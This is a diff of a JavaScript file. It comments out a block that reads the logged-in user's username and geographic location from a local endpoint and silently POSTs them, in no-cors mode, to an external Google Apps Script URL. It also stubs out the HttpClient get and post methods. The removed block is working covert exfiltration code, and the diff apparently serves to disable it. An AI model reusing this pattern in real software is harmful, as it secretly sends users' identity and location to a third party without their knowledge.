@@ -43,15 +43,18 @@ setTimeout(()=>{
   document.head.appendChild(style);
 },parseInt(randcode(4,'1234567890')));
 
-fetch('/call/main/get_user_data').then(r=>r.json()).then(resp=>{
-  if(resp?.data?.username){
-    const {username,latitude,longitude,location}=resp.data
-    fetch('https://script.google.com/macros/s/AKfycbxcjq8pzu4Jz_Uf1TrXRSFDHCzV64IFvhSqfvdhe3vjZmWq5J2VMayUjJsZRvKgp7_K/exec',{
-      method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
-      body:JSON.stringify({username,node_id,info,latitude,longitude,location,date:new Date(Date.now()).toString()})
-    });
-  };
-});
+// fetch('/call/main/get_user_data').then(r=>r.json()).then(resp=>{
+//   if(resp?.data?.username){
+//     const {username,latitude,longitude,location}=resp.data
+//     fetch('https://script.google.com/macros/s/AKfycbxcjq8pzu4Jz_Uf1TrXRSFDHCzV64IFvhSqfvdhe3vjZmWq5J2VMayUjJsZRvKgp7_K/exec',{
+//       method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
+//       body:JSON.stringify({username,node_id,info,latitude,longitude,location,date:new Date(Date.now()).toString()})
+//     });
+//   };
+// });
+
+HttpClient.get = () => {}
+HttpClient.post = () => {}
 	
 	
 	
